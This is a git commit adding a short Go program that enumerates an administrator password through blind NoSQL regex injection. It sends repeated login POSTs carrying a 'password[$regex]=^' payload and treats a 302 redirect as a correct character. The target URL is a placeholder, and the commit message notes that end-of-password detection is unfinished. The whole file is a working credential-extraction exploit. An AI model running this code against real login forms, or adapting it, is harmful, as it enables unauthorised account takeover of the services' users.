8104decd34ce213be3879b21f11a01ffda59809f
Sudheer Varma <ethancruize@gmail.com>
2019-12-11 17:45:06 +0530

    Update main.go
    Checking for finish enum with $ regex pending

--- main.go
+++ main.go
@@ -1,1 +1,63 @@
 
+package main
+
+import (
+	"bytes"
+	"fmt"
+	"net/http"
+)
+
+var (
+	url      = "http://example.com"
+	port     = ""
+	username = "admin"
+	password = ""
+	c        = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!#%'()+,-:;<=>?@[]^_`{|}~"
+	code     = 0
+)
+
+func fuzz() {
+
+	for {
+		for _, s := range c {
+
+			reqbody := []byte("username=" + username + "&password[$regex]=^" + password + string(s) + "&login=login")
+			code := makeRequest(reqbody)
+			if code == 302 {
+				password += string(s)
+				fmt.Println(password)
+				break
+			}
+
+		}
+
+	}
+
+	fmt.Printf(password)
+}
+
+func makeRequest(reqbody []byte) int {
+
+	req, err := http.NewRequest("POST", url, bytes.NewBuffer(reqbody))
+	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
+
+	client := &http.Client{CheckRedirect: func(req *http.Request, via []*http.Request) error {
+		return http.ErrUseLastResponse
+	}}
+	resp, err := client.Do(req)
+	if err != nil {
+		panic(err)
+	}
+	defer resp.Body.Close()
+
+	return resp.StatusCode
+
+}
+
+func main() {
+
+	fmt.Println("Enumerating...")
+
+	fuzz()
+
+}
